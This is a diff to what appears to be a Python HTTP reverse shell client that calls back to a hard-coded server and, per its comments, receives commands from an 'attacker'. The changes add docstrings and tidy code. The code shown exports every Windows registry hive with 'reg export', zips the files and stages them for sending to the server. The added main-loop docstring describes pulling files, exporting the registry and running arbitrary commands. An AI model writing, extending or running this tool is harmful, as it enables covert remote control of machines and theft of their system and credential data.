@@ -6,7 +6,6 @@ import subprocess
 import time
 import requests
 import os
-import shutil
 
 IP = 'http://' + '172.19.69.245' + ':8080'
 
@@ -19,25 +18,24 @@ HTTP Reverse Shell Client
 
 
 def pull_registry():
+    """
+    Using windows reg export batch command exports all registry 
+    keys (other than ones requiring admin access like SAM). Following
+    the exporiting of the registry to files, those files will be zipped,
+    removed, and then sent back to the server. 
+    """
     regKeys = ['HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER',
                'HKEY_LOCAL_MACHINE', 'HKEY_USERS', 'HKEY_CURRENT_CONFIG']
 
     zipfile = 'reg.zip'
-    fileNamespathList = []
     with ZipFile(zipfile, 'w') as zip:
         for key in regKeys:
             fname = f"bkReg_{key}.reg"
-            fileNamespathList.append(fname)
             filenamepath = f"{fname}"
-            regkk = 'reg export' + " " + key + " " + filenamepath
+            regkk = f"reg export {key} {filenamepath}"
             os.system(regkk)
             zip.write(filenamepath)
             os.remove(filenamepath)
-
-        # writing each file one by one
-        # for file in fileNamespathList:
-        #     zip.write(file)
-        #     os.remove(file)
 
     # path to zip file containing reg keys, start with `^ `
     exp_cmd = f'^ ./{zipfile}'
@@ -98,6 +96,16 @@ def run_process(command):
 
 
 def main():
+    """
+    Main logic loop
+
+    Based on input from server runs either:
+
+            pulls specified file
+            exports registry
+            run specified command
+    """
+
     while True:
 
         # Setup connection to attacker
